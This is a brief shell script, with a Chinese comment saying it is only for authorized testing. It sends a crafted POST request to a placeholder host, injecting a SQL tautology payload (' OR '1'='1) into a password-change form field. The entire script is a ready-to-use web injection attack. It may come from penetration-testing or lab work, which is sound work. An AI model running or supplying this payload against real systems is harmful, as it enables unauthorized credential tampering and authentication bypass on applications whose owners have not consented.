#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X POST 'http://TARGET:8080/014' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'password_new=%27%20OR%20%271%27%3D%271&Submit=Submit'
